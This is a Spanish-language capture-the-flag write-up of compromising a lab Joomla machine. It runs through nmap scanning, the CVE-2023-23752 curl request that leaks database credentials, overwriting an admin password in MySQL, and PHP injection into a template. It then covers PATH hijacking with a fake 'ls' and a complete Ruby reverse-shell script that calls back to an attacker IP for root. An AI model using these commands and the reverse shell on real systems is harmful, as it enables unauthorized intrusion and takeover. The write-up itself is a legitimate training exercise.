- Tags: #InformationLeakage #mysql #ruby #joomla #PathHijacking
_____
comenzamos la maquina aplicando el tipico escaneo de nmap.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPort 
```

para después aplicar un escaneo de versiones y servicios sobre lo puertos abiertos.

```shell
nmap -p <Puertos> <IP> -sCV -oN target 
```

______
![](attachment/bccbca0de49c69de7067da7824b49456.png)
_____
continuamos con la verificación del servicio web para ver si se encuentra información sobre a que nos enfrentamos.
____
![](attachment/63ea0a6a6b75267a4a02a95effb2bc59.png)
_____
por ahora solo tenemos la pagina de instalación del servicio de apache2, aplicaremos fuzzing y veremos que otra cosa encontramos. 
______
![](attachment/072199977272d31cf7fa4a88e2e61405.png)
_____
tenemos un directorio llamado wordpress el cual también aplicaremos fuzzing para ver que contiene.
_____
![](attachment/d264415385e0a66dd6b745ada36701a7.png)
______
veremos todos estos directorios, pero si entramos a la web veremos que nos enfrentamos a un joomla, por lo que nos disponemos a usar **joomscan** para tratar de enumerar su versión y ver si es vulnerable.
________
![](attachment/f4d324e11a17c67e4d2cdaa2ec71e426.png)
_____
tenemos una versión por lo que podemos buscar en la web y ver que encontramos.

encontramos la siguiente vulnerabilidad: Joomla! CVE-2023-23752 to Code Execution

en el blog nos indica que si aplicamos un curl a la siguiente dirección:

```shell
curl -v http://172.17.0.2/wordpress/api/index.php/v1/config/application?public=true
```

podremos encontrar credenciales para una base de datos, osea que es información sensible filtrada.
_________
![](attachment/8a286f549dde7e61a778e36f809f64f8.png)
______
en efecto tenemos credenciales para una base de datos, ahora podremos conectarnos.

```shell
mysql -h 172.17.0.2 -u joomla_user -p
```

_____
tenemos 3 bases de datos pero nos interesa una sola, y de esa listaremos todas sus tablas.
_____
![](attachment/ea2e637285cccaf6cfeef1c22e448102.png)
_____
identificamos la tabla de nuestro interés y listamos su contenido.
____
![](attachment/07802b9048c2a789db75ee3b0458b54c.png)
_____
![](attachment/9fc247e756779155e8e98704e67040ba.png)
______
tenemos unas credenciales pero primero vamos a verificar los permisos que tenemos sobre esta base de datos.
________
![](attachment/78985f5aede936ac16fac68ddc7656c8.png)
____
**GRANT USAGE ON _._ TO 'joomla_user'@'%'**:

Este privilegio es muy básico y no otorga ningún permiso específico para manipular datos o la estructura de la base de datos. Simplemente permite la conexión al servidor.

**_GRANT ALL PRIVILEGES ON `joomla_db`._ TO 'joomla_user'@'%'**:

Este es un privilegio más significativo. Indica que el usuario `joomla_user` tiene "todos los privilegios" (`ALL PRIVILEGES`) sobre todas las tablas (`.*`) de la base de datos `joomla_db`. Esto incluye permisos como `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `CREATE`, `DROP`, `ALTER`, entre otros.

entonces podemos modificar esa base de datos, lo siguiente que haremos es cambiar la contraseña del usuario firstatack

usando el siguiente comando de mysql.

```shell
Update ffsnq_users SET password = "hash" WHERE id=76;
```

se cambio la contraseña que tenia por root, de esta forma logramos acceder al panel administrativo de joomla.

busque las platillas e inyecte código php, específicamente en la platilla de index.php
______
![](attachment/f11461e6586f8214af0c1ed2a939d845.png)
_____
lo cual me permitirá la ejecución de comandos remotos.
_____
![](attachment/e3e19d162fd937025bbda83efe20d9ca.png)
______
por lo que ahora nos mandaremos una reverse shell para así ingresar al sistema.
_____
![](attachment/7bf70451dc54a3a3717ac6a3bff110e2.png)
______
aplicamos el tratamiento de la tty, ahora buscaremos formas potenciales de escalar privilegios.

revisando los directorios existentes nos encontramos con lo siguiente.
_____
![](attachment/8e340131d35974d0d6607a24c73d84db.png)
_____
es una cadena codificada en base64, si la intentamos decodificar obtendremos lo siguiente.
_____
![](attachment/6630165d02e95b8d15e8bf1dcea7087e.png)
______
adelanto que la palabra sheena es lo mismo que obtendremos del otro modo que aplicaremos.

se puede transferir un archivo al codificarlo con base64, esto es útil si queremos transferir un archivo de una maquina a otra y no contamos con otros metodos.

por lo que copiaremos la cadena en base64 y la colocaremos dentro de un archivo en nuestra maquina atacante.
______
![](attachment/12d27237fc7b94b1785f8683a558b68f.png)
_____
el cual sera un comprimido codificado con base64, ahora lo que haremos es decodificar el comprimido y nos quedara solo con la extensión .zip
_________
![](attachment/9280601efb50e5429c958a054df8b8e5.png)
_____
si descomprimimos ese .zip nos dejara un fichero .txt el cual contiene la cadena sheena.

por lo que esa seria creo la forma correcta de hacerlo y nos aseguramos de que la cadena este completa y que no haya sido alterada.

ahora probemos pivotar al usuario gadalupe.
______
![](attachment/341334b444c8191a0c18a1f751fff073.png)
_____
ahora veamos como podemos pivotar al usuario ignacio, apliquemos un sudo -l y veamos que nos aparece.
____
![](attachment/6562669d606bb96f8a69f5aed007b639.png)
______
si ejecutamos el script veremos lo siguiente.
_____
![](attachment/aa5b701eab8073ca7d07aaf69460889d.png)
____
parece que el script esta tratando de utilizar el comando ls alojado en una dirección, pero el como podemos ver el mensaje el script no en encuentra el archivo o directorio.

veremos que hay dentro del directorio y veremos si se nos permite crear el archivo ls y aprovecharnos del mismo para escalar al usuario ignacio.
______
![](attachment/61d6e21b56a8b20779e46cd20b3dba9e.png)
_____
tenemos un archivo llamado **hola** el cual podremos modificar.

cambiaremos su nombre a **ls** y agregaremos en su interior el siguiente contenido `/bin/bash` tambien le tenemos que otorgar permisos de ejecución con el comando `chmod +x ls`-

ahora podemos ejecutar el script como ignacio y cuando el script busque por la ruta que tiene especificada esta vez si se encontrara con el archivo ls y podrá hacer uso del mismo y al ejecutarse automáticamente seremos el usuario ignacio.
_______
![](attachment/0488967a8d7f7166c9b9b7bd34483ecd.png)
_____
ahora veremos como escalar a root, si aplicamos el comando sudo -l veremos lo siguiente.
______
![](attachment/1f7738aae1578723124d80fef908b381.png)
_____
podemos ejecutar como root y sin proporcionar contraseña ruby ademas de un script con nombre saludo.

podemos modificar el script por lo que agregaremos una reverse shell en ruby para que nos otorgue el root.

```ruby
#!/usr/bin/env ruby
# syscall 33 = dup2 on 64-bit Linux
# syscall 63 = dup2 on 32-bit Linux
# test with nc -lvp 1337 

require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 443, '192.168.1.103'

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'
```
____
![](attachment/1e7bca95e6944af834d444b0b736021d.png)
______
de esa forma obtenemos el root.